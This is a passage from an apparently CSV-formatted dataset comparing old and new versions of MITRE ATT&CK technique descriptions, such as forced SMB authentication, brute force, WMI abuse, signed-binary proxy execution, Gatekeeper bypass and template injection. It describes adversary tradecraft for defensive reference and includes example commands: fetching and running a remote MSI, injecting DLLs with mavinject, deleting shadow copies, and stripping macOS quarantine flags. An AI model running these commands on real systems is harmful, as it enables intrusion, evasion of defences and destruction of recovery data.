Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials, or reuse it for [Pass the Hash](https://attack.mitre.org/techniques/T1075). (Citation: Cylance Redirect to SMB)

There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)"
A085,T1110,9.0,10.0,Brute Force,Brute Force,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.","Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access."
A086,T1071,12.0,13.0,Application Layer Protocol,Application Layer Protocol,"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ","Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. "
A087,T1574.011,9.0,10.0,Services Registry Permissions Weakness,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: Registry Key Security)

If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness) ","Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)

Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>.(Citation: malware_hides_service)"
A088,T1040,2.0,3.0,Network Sniffing,Network Sniffing,"Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.

User credentials may be sent over an insecure, unencrypted protocol that can be captured and obtained through network packet analysis. An adversary may place a network interface into promiscuous mode, using a utility to capture traffic in transit over the network or use span ports to capture a larger amount of data. In addition, techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning, can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Detection: Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.

Platforms: Linux, macOS, Windows

Data Sources: Network device logs, Host network interface, Netflow/Enclave netflow

Permissions Required: Administrator, SYSTEM

System Requirements: Network interface access and packet capture driver","Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities."
A089,T1098.001,13.0,14.0,Additional Cloud Credentials,Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)

In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)

Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)

In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.
(Citation: Crowdstrike AWS User Federation Persistence)","Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)

In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)

Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) 

In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.
(Citation: Crowdstrike AWS User Federation Persistence)"
A090,T1047,14.0,15.0,Windows Management Instrumentation,Windows Management Instrumentation,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)

An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)","Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.

The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)

**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)"
A091,T1218,6.0,7.0,Signed Binary Proxy Execution,Signed Binary Proxy Execution,"Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

### Msiexec.exe
Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)

* <code>msiexec.exe /q /i ""C:\path\to\file.msi""</code>
* <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>
* <code>msiexec.exe /y ""C:\path\to\file.dll""</code>

### Mavinject.exe
Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

* <code>""C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe"" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
* <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>

### SyncAppvPublishingServer.exe
SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

### Odbcconf.exe
Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)

* <code>odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;</code>

Several other binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)",Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.
A092,T1196,2.0,3.0,Control Panel Items,Control Panel Items,"Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)

For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)

Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via Spearphishing Attachment campaigns  (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.

Detection: Monitor and analyze activity related to items associated with CPL files, such as the Windows Control Panel process binary (control.exe) and the Control_RunDLL and ControlRunDLLAsUser API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before Rundll32 is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter Rundll32 command, which may bypass detections and/or execution filters for control.exe. (Citation: TrendMicro CPL Malware Jan 2014)

Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:
*Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code> and <code>HKEY_CLASSES_ROOT\CLSID\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)
* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>Cpls</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(""c:\windows\system32\control.exe {Canonical_Name}"", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>). (Citation: Microsoft Implementing CPL)
*Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers</code> where {name} is the predefined name of the system item. (Citation: Microsoft Implementing CPL)

Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques. (Citation: TrendMicro CPL Malware Jan 2014)

Platforms: Windows

Data Sources: API monitoring, Binary file metadata, DLL monitoring, Process command-line parameters, Process Monitoring, Windows Registry, Windows event logs

Defense Bypassed: Application whitelisting, Process whitelisting

Permissions Required: User, Administrator, SYSTEM

Remote Support: No","Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)

For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)

Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting."
A093,T1553.001,9.0,10.0,Gatekeeper Bypass,Gatekeeper Bypass,"Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. 

Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, it is possible to avoid setting this flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)
 
In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)","Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls in macOS. When documents, applications, or programs are downloaded an extended attribute (xattr) called <code>com.apple.quarantine</code> can be set on the file by the application performing the download. This attribute, also known as a quarantine flag, is read by Apple's Gatekeeper defense program when the file is run and provides a prompt to the user to allow or deny execution. Gatekeeper also monitors an application's usage of dynamic libraries (dylibs) loaded outside the application folder on any quarantined binary, often using the <code>dlopen</code> function. If the quarantine flag is set in macOS 10.15+, Gatekeeper also checks for a notarization ticket and sends a cryptographic hash to Apple's servers to check for validity for all unsigned executables.(Citation: TheEclecticLightCompany apple notarization )(Citation: Bypassing Gatekeeper)

The quarantine flag is an opt-in system and not imposed by macOS. If an application opts-in, a file downloaded from the Internet will be given a quarantine flag before being saved to disk. Any application or user with write permissions to the file can change or strip the quarantine flag. With elevated permission (sudo), this attribute can be removed from any file. The presence of the <code>com.apple.quarantine</code> quarantine flag can be checked with the xattr command <code>xattr -l /path/to/examplefile</code>. Similarly, this attribute can be recursively removed from all files in a folder using xattr, <code>sudo xattr -d com.apple.quarantine /path/to/folder</code>.(Citation: 20 macOS Common Tools and Techniques)(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: theevilbit gatekeeper bypass 2021)

Apps and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the <code>curl</code> command do not set this flag. Additionally, it is possible to avoid setting this flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), which may bypass Gatekeeper. (Citation: Methods of Mac Malware Persistence)(Citation: Clearing quarantine attribute)(Citation: OceanLotus for OS X)"
A094,T1036.005,16.0,17.0,Match Legitimate Name or Location,Match Legitimate Resource Name or Location,"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.

Adversaries may also use the same icon of the file they are trying to mimic.","Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. 

This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)"
A095,T1110,3.0,4.0,Brute Force,Brute Force,"Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

[Credential Dumping](https://attack.mitre.org/techniques/T1003) to obtain password hashes may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

A related technique called password spraying uses one password, or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)","Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

A related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)


In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625."
A096,T1120,2.0,3.0,Peripheral Device Discovery,Peripheral Device Discovery,"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.

Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Windows

Permissions Required: User, Administrator, SYSTEM",Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.
A097,T1221,6.0,7.0,Template Injection,Template Injection,"Microsoft’s Open Office XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)

Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Adversaries may abuse this technology to initially conceal malicious code to be executed via documents (i.e. [Scripting](https://attack.mitre.org/techniques/T1064)). Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)

This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)","Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)

Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Adversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)

This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)"
A098,T1127,6.0,7.0,Trusted Developer Utilities,Trusted Developer Utilities Proxy Execution,"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.

